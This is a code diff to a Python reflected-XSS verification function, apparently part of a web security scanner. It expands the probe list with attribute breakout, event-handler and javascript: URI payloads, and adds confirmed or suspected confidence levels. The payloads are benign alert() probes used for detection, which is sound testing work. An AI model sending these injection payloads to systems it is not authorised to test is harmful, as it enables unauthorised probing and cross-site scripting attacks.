@@ -207,18 +207,25 @@ def verify_reflected_xss(url: str, param: str, method: str, cookie: str) -> tupl
     m = "dxsc9k1z"
     # (payload, human tag). Ordered cheap->broad; each proves execution only if it appears
     # verbatim (the breakout char + handler survived un-encoded).
-    # This is the CONSERVATIVE, low-false-positive safety net — every payload carries angle
-    # brackets, so a VERBATIM reflection always opens a real tag => genuinely executable. It stays
-    # deliberately narrow (no attribute/CSS/event-handler breakouts): those need HEADLESS execution
-    # confirmation to avoid false positives, which is dalfox's job. Adds only the <img>/script-strip
-    # bypass over a single payload, so a <script>-filtering app is still caught.
+    # Go DEEP: cover every injection context. Each payload's `conf` is the confidence a VERBATIM
+    # reflection earns. Angle-bracket payloads (<svg>/<img>) that reflect verbatim always open a
+    # real tag => CONFIRMED executable. Attribute/event-handler breakouts (bare " onmouseover=)
+    # reflecting verbatim are exploitable IN an attribute context but can also echo as harmless
+    # body text => SUSPECTED (flagged for the analyst, headless-confirm recommended). We surface
+    # both rather than dropping the deep payloads — thoroughness over silence.
     payloads = (
-        (f"<sVg/onload=alert({m})>", "html-tag"),                 # HTML body context
-        (f"<img src=x onerror=alert({m})>", "tag/script-strip"),  # bypasses <script> stripping
+        (f"<sVg/onload=alert({m})>", "html-tag", "confirmed"),
+        (f"<img src=x onerror=alert({m})>", "script-strip-bypass", "confirmed"),
+        (f'"><sVg/onload=alert({m})>', "dq-attr-breakout", "confirmed"),
+        (f"'><sVg/onload=alert({m})>", "sq-attr-breakout", "confirmed"),
+        (f'" onmouseover="alert({m})//', "dq-event-handler", "suspected"),
+        (f"' onmouseover='alert({m})//", "sq-event-handler", "suspected"),
+        (f"javascript:alert({m})//", "js-uri", "suspected"),     # href/src sink context
     )
     headers = {"Cookie": cookie} if cookie else {}
     encoded = False
-    for pay, tag in payloads:
+    suspected = None
+    for pay, tag, conf in payloads:
         try:
             if method == "POST":
                 r = httpx.post(url, data={param: pay}, headers=headers,
@@ -229,10 +236,15 @@ def verify_reflected_xss(url: str, param: str, method: str, cookie: str) -> tupl
         except Exception:  # noqa: BLE001 - try the next payload
             continue
         _feed(url, r.text)   # passive PII inspection of the audit-time response (Burp-style)
-        if pay in r.text:                       # reflected VERBATIM => breakout survived => XSS
-            return True, f"payload reflected unencoded ({tag})"
-        if m in r.text:                         # echoed but neutralised (encoded/stripped)
+        if pay in r.text:                       # reflected VERBATIM => breakout survived
+            if conf == "confirmed":
+                return True, f"reflected unencoded ({tag}) — confirmed executable"
+            # remember the first suspected hit but keep trying for a confirmed one
+            suspected = suspected or f"reflected unencoded ({tag}) — SUSPECTED (context-dependent)"
+        elif m in r.text:
             encoded = True
+    if suspected:
+        return True, suspected
     return (False, "reflected but encoded/neutralised") if encoded else (False, "not reflected")
 
 
